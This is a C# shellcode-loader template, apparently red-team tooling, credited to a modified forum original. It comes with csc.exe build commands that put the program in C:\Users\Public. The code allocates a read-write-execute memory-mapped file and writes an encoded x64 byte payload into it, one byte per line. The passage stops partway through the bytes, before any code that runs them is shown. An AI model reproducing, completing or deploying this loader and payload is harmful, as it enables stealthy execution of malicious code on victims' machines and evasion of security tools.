////////////////////////////
//
// C# Memory Mapping Template
// Original Template: https://atom0s.com/forums/viewtopic.php?t=178
// Modified By: Brian Fehrman (@fullmetalcache)
// Date Modified: 2018-11-27
//
////////////////////////////

//x64
//C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /platform:x64 /out:C:\Users\Public\prog.exe C:\Users\Public\mmniceness.cs

//x86
//C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /unsafe /platform:x86 /out:C:\Users\Public\prog.exe C:\Users\Public\mmniceness.cs

namespace nicenessExample
{
	using System;
	using System.IO.MemoryMappedFiles;
	using System.Runtime.InteropServices;
 
	class Program
	{
		private delegate IntPtr GetPebDelegate();
 
		private unsafe static IntPtr GetPeb()
		{

			const int niceness_length = 943;
;
			MemoryMappedFile mmf = null;
			MemoryMappedViewAccessor mmva = null;
 
			try
			{
				mmf = MemoryMappedFile.CreateNew("__niceness", niceness_length, MemoryMappedFileAccess.ReadWriteExecute);
 
				mmva = mmf.CreateViewAccessor(0, niceness_length, MemoryMappedFileAccess.ReadWriteExecute);

mmva.Write(0, ((byte)0x48));
mmva.Write(1, ((byte)0x31));
mmva.Write(2, ((byte)0xc9));
mmva.Write(3, ((byte)0x48));
mmva.Write(4, ((byte)0x81));
mmva.Write(5, ((byte)0xe9));
mmva.Write(6, ((byte)0x8f));
mmva.Write(7, ((byte)0xff));
mmva.Write(8, ((byte)0xff));
mmva.Write(9, ((byte)0xff));
mmva.Write(10, ((byte)0x48));
mmva.Write(11, ((byte)0x8d));
mmva.Write(12, ((byte)0x05));
mmva.Write(13, ((byte)0xef));
mmva.Write(14, ((byte)0xff));
mmva.Write(15, ((byte)0xff));
mmva.Write(16, ((byte)0xff));
mmva.Write(17, ((byte)0x48));
mmva.Write(18, ((byte)0xbb));
mmva.Write(19, ((byte)0xef));
mmva.Write(20, ((byte)0x10));
mmva.Write(21, ((byte)0x61));
mmva.Write(22, ((byte)0x1c));
mmva.Write(23, ((byte)0x14));
mmva.Write(24, ((byte)0x2a));
mmva.Write(25, ((byte)0x8a));
mmva.Write(26, ((byte)0x15));
mmva.Write(27, ((byte)0x48));
mmva.Write(28, ((byte)0x31));
mmva.Write(29, ((byte)0x58));
mmva.Write(30, ((byte)0x27));
mmva.Write(31, ((byte)0x48));
mmva.Write(32, ((byte)0x2d));
mmva.Write(33, ((byte)0xf8));
mmva.Write(34, ((byte)0xff));
mmva.Write(35, ((byte)0xff));
mmva.Write(36, ((byte)0xff));
mmva.Write(37, ((byte)0xe2));
mmva.Write(38, ((byte)0xf4));
mmva.Write(39, ((byte)0xa7));
mmva.Write(40, ((byte)0x21));
mmva.Write(41, ((byte)0xa8));
mmva.Write(42, ((byte)0x54));
mmva.Write(43, ((byte)0x95));
mmva.Write(44, ((byte)0xc3));
mmva.Write(45, ((byte)0x1e));
mmva.Write(46, ((byte)0xea));
mmva.Write(47, ((byte)0x10));
mmva.Write(48, ((byte)0xef));
mmva.Write(49, ((byte)0x29));
mmva.Write(50, ((byte)0x91));
mmva.Write(51, ((byte)0x11));
mmva.Write(52, ((byte)0xc5));
mmva.Write(53, ((byte)0x75));
mmva.Write(54, ((byte)0xea));
mmva.Write(55, ((byte)0x10));
mmva.Write(56, ((byte)0x58));
mmva.Write(57, ((byte)0xda));
mmva.Write(58, ((byte)0xd4));
mmva.Write(59, ((byte)0x11));
mmva.Write(60, ((byte)0x3e));
mmva.Write(61, ((byte)0x3e));
mmva.Write(62, ((byte)0x2a));
mmva.Write(63, ((byte)0x65));
mmva.Write(64, ((byte)0xa8));
mmva.Write(65, ((byte)0x8e));
mmva.Write(66, ((byte)0x54));
mmva.Write(67, ((byte)0x25));
mmva.Write(68, ((byte)0x72));
mmva.Write(69, ((byte)0xad));
mmva.Write(70, ((byte)0x5d));
mmva.Write(71, ((byte)0xc2));
mmva.Write(72, ((byte)0xe8));
mmva.Write(73, ((byte)0x9e));
mmva.Write(74, ((byte)0xe3));
mmva.Write(75, ((byte)0xeb));
mmva.Write(76, ((byte)0xc8));
mmva.Write(77, ((byte)0x7e));
mmva.Write(78, ((byte)0x95));
mmva.Write(79, ((byte)0xdb));
mmva.Write(80, ((byte)0xcd));
mmva.Write(81, ((byte)0x9d));
mmva.Write(82, ((byte)0xa2));
mmva.Write(83, ((byte)0x77));
mmva.Write(84, ((byte)0x0b));
mmva.Write(85, ((byte)0x9a));
mmva.Write(86, ((byte)0x22));
mmva.Write(87, ((byte)0x15));
mmva.Write(88, ((byte)0x4c));
mmva.Write(89, ((byte)0x58));
mmva.Write(90, ((byte)0x26));
mmva.Write(91, ((byte)0x71));
mmva.Write(92, ((byte)0x6d));
mmva.Write(93, ((byte)0x9a));
mmva.Write(94, ((byte)0x22));
mmva.Write(95, ((byte)0xa2));
mmva.Write(96, ((byte)0xbf));
mmva.Write(97, ((byte)0x90));
mmva.Write(98, ((byte)0x60));
mmva.Write(99, ((byte)0x03));
mmva.Write(100, ((byte)0x10));
mmva.Write(101, ((byte)0xa3));
mmva.Write(102, ((byte)0xcf));
mmva.Write(103, ((byte)0xe5));
mmva.Write(104, ((byte)0x09));
mmva.Write(105, ((byte)0x9d));
mmva.Write(106, ((byte)0x12));
mmva.Write(107, ((byte)0xc6));
mmva.Write(108, ((byte)0xb5));
mmva.Write(109, ((byte)0x2d));
mmva.Write(110, ((byte)0xf0));
mmva.Write(111, ((byte)0x12));
mmva.Write(112, ((byte)0xfb));
mmva.Write(113, ((byte)0x2a));
mmva.Write(114, ((byte)0xdc));
mmva.Write(115, ((byte)0x7c));
mmva.Write(116, ((byte)0x66));
mmva.Write(117, ((byte)0x68));
mmva.Write(118, ((byte)0xaf));
mmva.Write(119, ((byte)0xbe));
mmva.Write(120, ((byte)0xce));
mmva.Write(121, ((byte)0x92));
mmva.Write(122, ((byte)0xd8));
mmva.Write(123, ((byte)0x0f));
mmva.Write(124, ((byte)0x60));
mmva.Write(125, ((byte)0xdf));
mmva.Write(126, ((byte)0x61));
mmva.Write(127, ((byte)0x3f));
mmva.Write(128, ((byte)0x0b));
mmva.Write(129, ((byte)0x16));
mmva.Write(130, ((byte)0xde));
mmva.Write(131, ((byte)0x6e));
mmva.Write(132, ((byte)0x60));
mmva.Write(133, ((byte)0xdf));
mmva.Write(134, ((byte)0xd6));
mmva.Write(135, ((byte)0xcc));
mmva.Write(136, ((byte)0x4b));
mmva.Write(137, ((byte)0x8d));
mmva.Write(138, ((byte)0x07));
mmva.Write(139, ((byte)0xfb));
mmva.Write(140, ((byte)0xd0));
mmva.Write(141, ((byte)0xc8));
mmva.Write(142, ((byte)0x00));
mmva.Write(143, ((byte)0xaf));
mmva.Write(144, ((byte)0xce));
mmva.Write(145, ((byte)0x22));
mmva.Write(146, ((byte)0x69));
mmva.Write(147, ((byte)0xb6));
mmva.Write(148, ((byte)0xd7));
mmva.Write(149, ((byte)0x0d));
mmva.Write(150, ((byte)0x66));
mmva.Write(151, ((byte)0x88));
mmva.Write(152, ((byte)0x79));
mmva.Write(153, ((byte)0xec));
mmva.Write(154, ((byte)0xd3));
mmva.Write(155, ((byte)0x65));
mmva.Write(156, ((byte)0x1a));
mmva.Write(157, ((byte)0x8f));
mmva.Write(158, ((byte)0x61));
mmva.Write(159, ((byte)0x55));
mmva.Write(160, ((byte)0x48));
mmva.Write(161, ((byte)0x12));
mmva.Write(162, ((byte)0x0c));
mmva.Write(163, ((byte)0xb6));
mmva.Write(164, ((byte)0xad));
mmva.Write(165, ((byte)0x41));
mmva.Write(166, ((byte)0xe0));
mmva.Write(167, ((byte)0x90));
mmva.Write(168, ((byte)0xcc));
mmva.Write(169, ((byte)0x14));
mmva.Write(170, ((byte)0x50));
mmva.Write(171, ((byte)0xb6));
mmva.Write(172, ((byte)0xad));
mmva.Write(173, ((byte)0xf6));
mmva.Write(174, ((byte)0x13));
mmva.Write(175, ((byte)0xcb));
mmva.Write(176, ((byte)0x0c));
mmva.Write(177, ((byte)0xb7));
mmva.Write(178, ((byte)0x62));
mmva.Write(179, ((byte)0xe8));
mmva.Write(180, ((byte)0xf9));
mmva.Write(181, ((byte)0x61));
mmva.Write(182, ((byte)0x21));
mmva.Write(183, ((byte)0x55));
mmva.Write(184, ((byte)0xf8));
mmva.Write(185, ((byte)0xa3));
mmva.Write(186, ((byte)0x88));
mmva.Write(187, ((byte)0x01));
mmva.Write(188, ((byte)0x7f));
mmva.Write(189, ((byte)0x46));
mmva.Write(190, ((byte)0x57));
mmva.Write(191, ((byte)0xe2));
mmva.Write(192, ((byte)0x36));
mmva.Write(193, ((byte)0x19));
mmva.Write(194, ((byte)0x5b));
mmva.Write(195, ((byte)0x63));
mmva.Write(196, ((byte)0xdf));
mmva.Write(197, ((byte)0x71));
mmva.Write(198, ((byte)0x81));
mmva.Write(199, ((byte)0x4c));
mmva.Write(200, ((byte)0x8a));
mmva.Write(201, ((byte)0xe8));
mmva.Write(202, ((byte)0x26));
mmva.Write(203, ((byte)0x9f));
mmva.Write(204, ((byte)0x97));
mmva.Write(205, ((byte)0xb3));
mmva.Write(206, ((byte)0x34));
mmva.Write(207, ((byte)0xfd));
mmva.Write(208, ((byte)0x32));
mmva.Write(209, ((byte)0x76));
mmva.Write(210, ((byte)0x77));
mmva.Write(211, ((byte)0xc9));
mmva.Write(212, ((byte)0xdf));
mmva.Write(213, ((byte)0xc3));
mmva.Write(214, ((byte)0xb7));
mmva.Write(215, ((byte)0xd9));
mmva.Write(216, ((byte)0x2a));
mmva.Write(217, ((byte)0xaf));
mmva.Write(218, ((byte)0x74));
mmva.Write(219, ((byte)0xff));
mmva.Write(220, ((byte)0xdf));
mmva.Write(221, ((byte)0x79));
mmva.Write(222, ((byte)0x37));
mmva.Write(223, ((byte)0xa4));
mmva.Write(224, ((byte)0x2a));
mmva.Write(225, ((byte)0xaf));
mmva.Write(226, ((byte)0x74));
mmva.Write(227, ((byte)0xbf));
mmva.Write(228, ((byte)0xdf));
mmva.Write(229, ((byte)0x79));
mmva.Write(230, ((byte)0x17));
mmva.Write(231, ((byte)0xec));
mmva.Write(232, ((byte)0x2a));
mmva.Write(233, ((byte)0x2b));
mmva.Write(234, ((byte)0x91));
mmva.Write(235, ((byte)0xd5));
mmva.Write(236, ((byte)0xdd));
mmva.Write(237, ((byte)0xbf));
mmva.Write(238, ((byte)0x54));
mmva.Write(239, ((byte)0x75));
mmva.Write(240, ((byte)0x2a));
mmva.Write(241, ((byte)0x15));
mmva.Write(242, ((byte)0xe6));
mmva.Write(243, ((byte)0x33));
mmva.Write(244, ((byte)0xab));
mmva.Write(245, ((byte)0x93));
mmva.Write(246, ((byte)0x19));
mmva.Write(247, ((byte)0xbe));
mmva.Write(248, ((byte)0x4e));
mmva.Write(249, ((byte)0x04));
mmva.Write(250, ((byte)0x67));
mmva.Write(251, ((byte)0x5e));
mmva.Write(252, ((byte)0x5e));
mmva.Write(253, ((byte)0xff));
mmva.Write(254, ((byte)0x24));
mmva.Write(255, ((byte)0xbd));
mmva.Write(256, ((byte)0xa3));
mmva.Write(257, ((byte)0xc6));
mmva.Write(258, ((byte)0xcb));
mmva.Write(259, ((byte)0xcd));
mmva.Write(260, ((byte)0xd6));
mmva.Write(261, ((byte)0xa3));
mmva.Write(262, ((byte)0x2d));
mmva.Write(263, ((byte)0x37));
mmva.Write(264, ((byte)0x30));
mmva.Write(265, ((byte)0x04));
mmva.Write(266, ((byte)0xad));
mmva.Write(267, ((byte)0xdd));
mmva.Write(268, ((byte)0xab));
mmva.Write(269, ((byte)0xba));
mmva.Write(270, ((byte)0x64));
mmva.Write(271, ((byte)0x6c));
mmva.Write(272, ((byte)0x04));
mmva.Write(273, ((byte)0xa5));
mmva.Write(274, ((byte)0x5e));
mmva.Write(275, ((byte)0x87));
mmva.Write(276, ((byte)0x9c));
mmva.Write(277, ((byte)0xf0));
mmva.Write(278, ((byte)0x6a));
mmva.Write(279, ((byte)0x39));
mmva.Write(280, ((byte)0x10));
mmva.Write(281, ((byte)0x24));
mmva.Write(282, ((byte)0x26));
mmva.Write(283, ((byte)0x9f));
mmva.Write(284, ((byte)0x1c));
mmva.Write(285, ((byte)0x72));
mmva.Write(286, ((byte)0xed));
mmva.Write(287, ((byte)0xbc));
mmva.Write(288, ((byte)0x62));
mmva.Write(289, ((byte)0x24));
mmva.Write(290, ((byte)0x6e));
mmva.Write(291, ((byte)0x1a));
mmva.Write(292, ((byte)0x57));
mmva.Write(293, ((byte)0x86));
mmva.Write(294, ((byte)0x02));
mmva.Write(295, ((byte)0xf4));
mmva.Write(296, ((byte)0x63));
mmva.Write(297, ((byte)0xf4));
mmva.Write(298, ((byte)0x76));
mmva.Write(299, ((byte)0x14));
mmva.Write(300, ((byte)0xdf));
mmva.Write(301, ((byte)0xea));
mmva.Write(302, ((byte)0x21));
mmva.Write(303, ((byte)0x37));
mmva.Write(304, ((byte)0x22));
mmva.Write(305, ((byte)0x04));
mmva.Write(306, ((byte)0x6f));
mmva.Write(307, ((byte)0x9e));
mmva.Write(308, ((byte)0x47));
mmva.Write(309, ((byte)0x11));
mmva.Write(310, ((byte)0x33));
mmva.Write(311, ((byte)0xf4));
mmva.Write(312, ((byte)0x9d));
mmva.Write(313, ((byte)0xed));
mmva.Write(314, ((byte)0x67));
mmva.Write(315, ((byte)0x14));
mmva.Write(316, ((byte)0xa3));
mmva.Write(317, ((byte)0x7a));
mmva.Write(318, ((byte)0x2d));
mmva.Write(319, ((byte)0xbd));
mmva.Write(320, ((byte)0xb4));
mmva.Write(321, ((byte)0x69));
mmva.Write(322, ((byte)0x17));
mmva.Write(323, ((byte)0x56));
mmva.Write(324, ((byte)0xdf));
mmva.Write(325, ((byte)0xc3));
mmva.Write(326, ((byte)0xa5));
mmva.Write(327, ((byte)0x10));
mmva.Write(328, ((byte)0x23));
mmva.Write(329, ((byte)0xe5));
mmva.Write(330, ((byte)0xef));
mmva.Write(331, ((byte)0x92));
mmva.Write(332, ((byte)0xd6));
mmva.Write(333, ((byte)0xf3));
mmva.Write(334, ((byte)0xa4));
mmva.Write(335, ((byte)0x84));
mmva.Write(336, ((byte)0x82));
mmva.Write(337, ((byte)0x51));
mmva.Write(338, ((byte)0xd7));
mmva.Write(339, ((byte)0xd3));
mmva.Write(340, ((byte)0x94));
mmva.Write(341, ((byte)0xbe));
mmva.Write(342, ((byte)0x41));
mmva.Write(343, ((byte)0xb4));
mmva.Write(344, ((byte)0x27));
mmva.Write(345, ((byte)0x1d));
mmva.Write(346, ((byte)0xf7));
mmva.Write(347, ((byte)0xea));
mmva.Write(348, ((byte)0x4f));
mmva.Write(349, ((byte)0xaa));
mmva.Write(350, ((byte)0x21));
mmva.Write(351, ((byte)0x37));
mmva.Write(352, ((byte)0x22));
mmva.Write(353, ((byte)0x00));
mmva.Write(354, ((byte)0x6f));
mmva.Write(355, ((byte)0x9e));
mmva.Write(356, ((byte)0x47));
mmva.Write(357, ((byte)0x94));
mmva.Write(358, ((byte)0x24));
mmva.Write(359, ((byte)0x37));
mmva.Write(360, ((byte)0x6e));
mmva.Write(361, ((byte)0x6c));
mmva.Write(362, ((byte)0x62));
mmva.Write(363, ((byte)0x14));
mmva.Write(364, ((byte)0xd7));
mmva.Write(365, ((byte)0xee));
mmva.Write(366, ((byte)0x2c));
mmva.Write(367, ((byte)0xbd));
mmva.Write(368, ((byte)0xb2));
mmva.Write(369, ((byte)0x65));
mmva.Write(370, ((byte)0xad));
mmva.Write(371, ((byte)0x9b));
mmva.Write(372, ((byte)0x1f));
mmva.Write(373, ((byte)0xba));
mmva.Write(374, ((byte)0x64));
mmva.Write(375, ((byte)0x6c));
mmva.Write(376, ((byte)0x23));
mmva.Write(377, ((byte)0x7c));
mmva.Write(378, ((byte)0x67));
mmva.Write(379, ((byte)0xc7));
mmva.Write(380, ((byte)0xc9));
mmva.Write(381, ((byte)0xab));
mmva.Write(382, ((byte)0x3f));
mmva.Write(383, ((byte)0xfd));
mmva.Write(384, ((byte)0x3a));
mmva.Write(385, ((byte)0x65));
mmva.Write(386, ((byte)0x7f));
mmva.Write(387, ((byte)0xde));
mmva.Write(388, ((byte)0xcd));
mmva.Write(389, ((byte)0xba));
mmva.Write(390, ((byte)0xe6));
mmva.Write(391, ((byte)0x50));
mmva.Write(392, ((byte)0x42));
mmva.Write(393, ((byte)0x65));
mmva.Write(394, ((byte)0x74));
mmva.Write(395, ((byte)0x60));
mmva.Write(396, ((byte)0x77));
mmva.Write(397, ((byte)0xaa));
mmva.Write(398, ((byte)0x24));
mmva.Write(399, ((byte)0xe5));
mmva.Write(400, ((byte)0x38));
mmva.Write(401, ((byte)0x6c));
mmva.Write(402, ((byte)0xad));
mmva.Write(403, ((byte)0x8d));
mmva.Write(404, ((byte)0x7e));
mmva.Write(405, ((byte)0xb9));
mmva.Write(406, ((byte)0x9a));
mmva.Write(407, ((byte)0x43));
mmva.Write(408, ((byte)0x9d));
mmva.Write(409, ((byte)0x79));
mmva.Write(410, ((byte)0x6e));
mmva.Write(411, ((byte)0xae));
mmva.Write(412, ((byte)0x4c));
mmva.Write(413, ((byte)0xa1));
mmva.Write(414, ((byte)0x2c));
mmva.Write(415, ((byte)0x02));
mmva.Write(416, ((byte)0x15));
mmva.Write(417, ((byte)0x4d));
mmva.Write(418, ((byte)0x48));
mmva.Write(419, ((byte)0xf6));
mmva.Write(420, ((byte)0xf9));
mmva.Write(421, ((byte)0x97));
mmva.Write(422, ((byte)0x11));
mmva.Write(423, ((byte)0xbc));
mmva.Write(424, ((byte)0x23));
mmva.Write(425, ((byte)0x72));
mmva.Write(426, ((byte)0x6e));
mmva.Write(427, ((byte)0x16));
mmva.Write(428, ((byte)0x76));
mmva.Write(429, ((byte)0xbb));
mmva.Write(430, ((byte)0xa2));
mmva.Write(431, ((byte)0x7e));
mmva.Write(432, ((byte)0x2e));
mmva.Write(433, ((byte)0x53));
mmva.Write(434, ((byte)0x00));
mmva.Write(435, ((byte)0x98));
mmva.Write(436, ((byte)0x68));
mmva.Write(437, ((byte)0x27));
mmva.Write(438, ((byte)0x36));
mmva.Write(439, ((byte)0xef));
mmva.Write(440, ((byte)0x2a));
mmva.Write(441, ((byte)0xad));
mmva.Write(442, ((byte)0xc7));
mmva.Write(443, ((byte)0xcc));
mmva.Write(444, ((byte)0xcd));
mmva.Write(445, ((byte)0xbf));
mmva.Write(446, ((byte)0x54));
mmva.Write(447, ((byte)0x7c));
mmva.Write(448, ((byte)0x2f));
mmva.Write(449, ((byte)0x15));
mmva.Write(450, ((byte)0xef));
mmva.Write(451, ((byte)0xcc));
mmva.Write(452, ((byte)0xc4));
mmva.Write(453, ((byte)0xbb));
mmva.Write(454, ((byte)0xdf));
mmva.Write(455, ((byte)0x86));
mmva.Write(456, ((byte)0x34));
mmva.Write(457, ((byte)0x5d));
mmva.Write(458, ((byte)0x81));
mmva.Write(459, ((byte)0x9f));
mmva.Write(460, ((byte)0x97));
mmva.Write(461, ((byte)0xf2));
mmva.Write(462, ((byte)0x65));
mmva.Write(463, ((byte)0x43));
mmva.Write(464, ((byte)0xb7));
mmva.Write(465, ((byte)0xcc));
mmva.Write(466, ((byte)0x2a));
mmva.Write(467, ((byte)0x9f));
mmva.Write(468, ((byte)0x97));
mmva.Write(469, ((byte)0xf2));
mmva.Write(470, ((byte)0x0a));
mmva.Write(471, ((byte)0xdf));
mmva.Write(472, ((byte)0x0b));
mmva.Write(473, ((byte)0x47));
mmva.Write(474, ((byte)0x47));
mmva.Write(475, ((byte)0xeb));
mmva.Write(476, ((byte)0xb9));
mmva.Write(477, ((byte)0x9b));
mmva.Write(478, ((byte)0x0b));
mmva.Write(479, ((byte)0xda));
mmva.Write(480, ((byte)0x0d));
mmva.Write(481, ((byte)0x24));
mmva.Write(482, ((byte)0x7c));
mmva.Write(483, ((byte)0xd7));
mmva.Write(484, ((byte)0x1e));
mmva.Write(485, ((byte)0x33));
mmva.Write(486, ((byte)0x2c));
mmva.Write(487, ((byte)0x7b));
mmva.Write(488, ((byte)0xa2));
mmva.Write(489, ((byte)0x9f));
mmva.Write(490, ((byte)0x27));
mmva.Write(491, ((byte)0x9f));
mmva.Write(492, ((byte)0x97));
mmva.Write(493, ((byte)0xbf));
mmva.Write(494, ((byte)0x54));
mmva.Write(495, ((byte)0x75));
mmva.Write(496, ((byte)0x31));
mmva.Write(497, ((byte)0x77));
mmva.Write(498, ((byte)0x4c));
mmva.Write(499, ((byte)0x9c));
mmva.Write(500, ((byte)0xc4));
mmva.Write(501, ((byte)0xbb));
mmva.Write(502, ((byte)0xdf));
mmva.Write(503, ((byte)0xeb));
mmva.Write(504, ((byte)0xeb));
mmva.Write(505, ((byte)0xbb));
mmva.Write(506, ((byte)0xe0));
mmva.Write(507, ((byte)0x9f));
mmva.Write(508, ((byte)0x97));
mmva.Write(509, ((byte)0xf2));
mmva.Write(510, ((byte)0x65));
mmva.Write(511, ((byte)0x43));
mmva.Write(512, ((byte)0xb7));
mmva.Write(513, ((byte)0xcc));
mmva.Write(514, ((byte)0x9a));
mmva.Write(515, ((byte)0x9f));
mmva.Write(516, ((byte)0x97));
mmva.Write(517, ((byte)0xf2));
mmva.Write(518, ((byte)0x4a));
mmva.Write(519, ((byte)0xc8));
mmva.Write(520, ((byte)0x56));
mmva.Write(521, ((byte)0x55));
mmva.Write(522, ((byte)0x6e));
mmva.Write(523, ((byte)0xc9));
mmva.Write(524, ((byte)0xc3));
mmva.Write(525, ((byte)0xa3));
mmva.Write(526, ((byte)0x1d));
mmva.Write(527, ((byte)0xf6));
mmva.Write(528, ((byte)0x24));
mmva.Write(529, ((byte)0x45));
mmva.Write(530, ((byte)0x44));
mmva.Write(531, ((byte)0xd2));
mmva.Write(532, ((byte)0xa2));
mmva.Write(533, ((byte)0x9d));
mmva.Write(534, ((byte)0x1d));
mmva.Write(535, ((byte)0xc4));
mmva.Write(536, ((byte)0x50));
mmva.Write(537, ((byte)0x1c));
mmva.Write(538, ((byte)0x68));
mmva.Write(539, ((byte)0xd1));
mmva.Write(540, ((byte)0xc6));
mmva.Write(541, ((byte)0xcb));
mmva.Write(542, ((byte)0x20));
mmva.Write(543, ((byte)0xee));
mmva.Write(544, ((byte)0x0d));
mmva.Write(545, ((byte)0x67));
mmva.Write(546, ((byte)0x43));
mmva.Write(547, ((byte)0xd6));
mmva.Write(548, ((byte)0xd9));
mmva.Write(549, ((byte)0x83));
mmva.Write(550, ((byte)0x10));
mmva.Write(551, ((byte)0xef));
mmva.Write(552, ((byte)0x27));
mmva.Write(553, ((byte)0x16));
mmva.Write(554, ((byte)0x79));
mmva.Write(555, ((byte)0xd8));
mmva.Write(556, ((byte)0xc5));
mmva.Write(557, ((byte)0xb9));
mmva.Write(558, ((byte)0x14));
mmva.Write(559, ((byte)0xde));
mmva.Write(560, ((byte)0x25));
mmva.Write(561, ((byte)0x60));
mmva.Write(562, ((byte)0x14));
mmva.Write(563, ((byte)0xfe));
mmva.Write(564, ((byte)0xfe));
mmva.Write(565, ((byte)0x98));
mmva.Write(566, ((byte)0x54));
mmva.Write(567, ((byte)0xdb));
mmva.Write(568, ((byte)0x56));
mmva.Write(569, ((byte)0x6c));
mmva.Write(570, ((byte)0x68));
mmva.Write(571, ((byte)0xc7));
mmva.Write(572, ((byte)0xf6));
mmva.Write(573, ((byte)0x80));
mmva.Write(574, ((byte)0x27));
mmva.Write(575, ((byte)0x89));
mmva.Write(576, ((byte)0x31));
mmva.Write(577, ((byte)0x15));
mmva.Write(578, ((byte)0x63));
mmva.Write(579, ((byte)0xa8));
mmva.Write(580, ((byte)0xd5));
mmva.Write(581, ((byte)0xc2));
mmva.Write(582, ((byte)0x34));
mmva.Write(583, ((byte)0xda));
mmva.Write(584, ((byte)0x00));
mmva.Write(585, ((byte)0x46));
mmva.Write(586, ((byte)0x69));
mmva.Write(587, ((byte)0xf6));
mmva.Write(588, ((byte)0xa3));
mmva.Write(589, ((byte)0xa5));
mmva.Write(590, ((byte)0x3c));
mmva.Write(591, ((byte)0x84));
mmva.Write(592, ((byte)0x21));
mmva.Write(593, ((byte)0x17));
mmva.Write(594, ((byte)0x51));
mmva.Write(595, ((byte)0xfe));
mmva.Write(596, ((byte)0xe5));
mmva.Write(597, ((byte)0xc1));
mmva.Write(598, ((byte)0x37));
mmva.Write(599, ((byte)0xf3));
mmva.Write(600, ((byte)0x00));
mmva.Write(601, ((byte)0x48));
mmva.Write(602, ((byte)0x4e));
mmva.Write(603, ((byte)0xb2));
mmva.Write(604, ((byte)0xa7));
mmva.Write(605, ((byte)0xc5));
mmva.Write(606, ((byte)0x0d));
mmva.Write(607, ((byte)0xfd));
mmva.Write(608, ((byte)0x28));
mmva.Write(609, ((byte)0x15));
mmva.Write(610, ((byte)0x50));
mmva.Write(611, ((byte)0xf5));
mmva.Write(612, ((byte)0xe2));
mmva.Write(613, ((byte)0x91));
mmva.Write(614, ((byte)0x00));
mmva.Write(615, ((byte)0xf6));
mmva.Write(616, ((byte)0x03));
mmva.Write(617, ((byte)0x51));
mmva.Write(618, ((byte)0x4b));
mmva.Write(619, ((byte)0xcd));
mmva.Write(620, ((byte)0xcd));
mmva.Write(621, ((byte)0xbb));
mmva.Write(622, ((byte)0x24));
mmva.Write(623, ((byte)0xcc));
mmva.Write(624, ((byte)0x09));
mmva.Write(625, ((byte)0x49));
mmva.Write(626, ((byte)0x14));
mmva.Write(627, ((byte)0xd9));
mmva.Write(628, ((byte)0xe1));
mmva.Write(629, ((byte)0xbb));
mmva.Write(630, ((byte)0x33));
mmva.Write(631, ((byte)0xdd));
mmva.Write(632, ((byte)0x3b));
mmva.Write(633, ((byte)0x70));
mmva.Write(634, ((byte)0x5e));
mmva.Write(635, ((byte)0xa9));
mmva.Write(636, ((byte)0xd0));
mmva.Write(637, ((byte)0xca));
mmva.Write(638, ((byte)0x21));
mmva.Write(639, ((byte)0xd5));
mmva.Write(640, ((byte)0x0c));
mmva.Write(641, ((byte)0x47));
mmva.Write(642, ((byte)0x43));
mmva.Write(643, ((byte)0xa7));
mmva.Write(644, ((byte)0xaf));
mmva.Write(645, ((byte)0xc4));
mmva.Write(646, ((byte)0x08));
mmva.Write(647, ((byte)0xfe));
mmva.Write(648, ((byte)0x11));
mmva.Write(649, ((byte)0x60));
mmva.Write(650, ((byte)0x6d));
mmva.Write(651, ((byte)0xfa));
mmva.Write(652, ((byte)0xe0));
mmva.Write(653, ((byte)0xbd));
mmva.Write(654, ((byte)0x22));
mmva.Write(655, ((byte)0xca));
mmva.Write(656, ((byte)0x2c));
mmva.Write(657, ((byte)0x5c));
mmva.Write(658, ((byte)0x40));
mmva.Write(659, ((byte)0xee));
mmva.Write(660, ((byte)0xe2));
mmva.Write(661, ((byte)0xb7));
mmva.Write(662, ((byte)0x57));
mmva.Write(663, ((byte)0xfb));
mmva.Write(664, ((byte)0x33));
mmva.Write(665, ((byte)0x5e));
mmva.Write(666, ((byte)0x51));
mmva.Write(667, ((byte)0xda));
mmva.Write(668, ((byte)0xa7));
mmva.Write(669, ((byte)0xbd));
mmva.Write(670, ((byte)0x52));
mmva.Write(671, ((byte)0xf9));
mmva.Write(672, ((byte)0x2f));
mmva.Write(673, ((byte)0x4b));
mmva.Write(674, ((byte)0x62));
mmva.Write(675, ((byte)0xe8));
mmva.Write(676, ((byte)0xa6));
mmva.Write(677, ((byte)0xa0));
mmva.Write(678, ((byte)0x3f));
mmva.Write(679, ((byte)0xd9));
mmva.Write(680, ((byte)0x17));
mmva.Write(681, ((byte)0x67));
mmva.Write(682, ((byte)0x7e));
mmva.Write(683, ((byte)0xc5));
mmva.Write(684, ((byte)0xa5));
mmva.Write(685, ((byte)0xb1));
mmva.Write(686, ((byte)0x12));
mmva.Write(687, ((byte)0xd3));
mmva.Write(688, ((byte)0x15));
mmva.Write(689, ((byte)0x7e));
mmva.Write(690, ((byte)0x43));
mmva.Write(691, ((byte)0xd9));
mmva.Write(692, ((byte)0xc2));
mmva.Write(693, ((byte)0x99));
mmva.Write(694, ((byte)0x22));
mmva.Write(695, ((byte)0x8c));
mmva.Write(696, ((byte)0x52));
mmva.Write(697, ((byte)0x42));
mmva.Write(698, ((byte)0x43));
mmva.Write(699, ((byte)0xcc));
mmva.Write(700, ((byte)0xf0));
mmva.Write(701, ((byte)0xab));
mmva.Write(702, ((byte)0x48));
mmva.Write(703, ((byte)0xd6));
mmva.Write(704, ((byte)0x25));
mmva.Write(705, ((byte)0x24));
mmva.Write(706, ((byte)0x6e));
mmva.Write(707, ((byte)0x16));
mmva.Write(708, ((byte)0x56));
mmva.Write(709, ((byte)0xa1));
mmva.Write(710, ((byte)0x3f));
mmva.Write(711, ((byte)0xfd));
mmva.Write(712, ((byte)0x3a));
mmva.Write(713, ((byte)0x69));
mmva.Write(714, ((byte)0x17));
mmva.Write(715, ((byte)0x56));
mmva.Write(716, ((byte)0xc4));
mmva.Write(717, ((byte)0xba));
mmva.Write(718, ((byte)0xdd));
mmva.Write(719, ((byte)0xbc));
mmva.Write(720, ((byte)0x50));
mmva.Write(721, ((byte)0x84));
mmva.Write(722, ((byte)0xa2));
mmva.Write(723, ((byte)0x9f));
mmva.Write(724, ((byte)0x97));
mmva.Write(725, ((byte)0xf2));
mmva.Write(726, ((byte)0x65));
mmva.Write(727, ((byte)0xec));
mmva.Write(728, ((byte)0x31));
mmva.Write(729, ((byte)0x77));
mmva.Write(730, ((byte)0x6f));
mmva.Write(731, ((byte)0x58));
mmva.Write(732, ((byte)0x55));
mmva.Write(733, ((byte)0x19));
mmva.Write(734, ((byte)0x30));
mmva.Write(735, ((byte)0x92));
mmva.Write(736, ((byte)0x59));
mmva.Write(737, ((byte)0xdb));
mmva.Write(738, ((byte)0xf3));
mmva.Write(739, ((byte)0xd7));
